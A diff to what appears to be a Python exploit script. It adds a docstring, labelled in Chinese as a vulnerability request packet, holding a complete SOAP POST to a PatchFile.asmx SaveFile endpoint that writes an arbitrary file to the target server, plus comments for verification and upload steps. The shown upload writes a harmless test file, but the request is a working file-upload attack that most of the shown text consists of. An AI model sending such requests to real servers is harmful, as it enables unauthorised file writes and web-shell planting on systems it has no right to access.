@@ -3,7 +3,27 @@ import argparse
 import time
 import warnings
 warnings.filterwarnings("ignore")
+"""
+漏洞数据包：
 
+POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
+Host: xx.xx.xx.xx
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
+Connection: close
+Content-Type: text/xml; charset=utf-8
+Content-Length: 413
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <SaveFile xmlns="http://tempuri.org/">
+      <binData>MTIzNDU2</binData>
+      <path>./</path>
+      <fileName>1.txt</fileName>
+    </SaveFile>
+  </soap:Body>
+</soap:Envelope>
+"""
 # 验证
 payload1=r"/CS/Office/AutoUpdates/PatchFile.asmx?op=SaveFile"
 # 上传
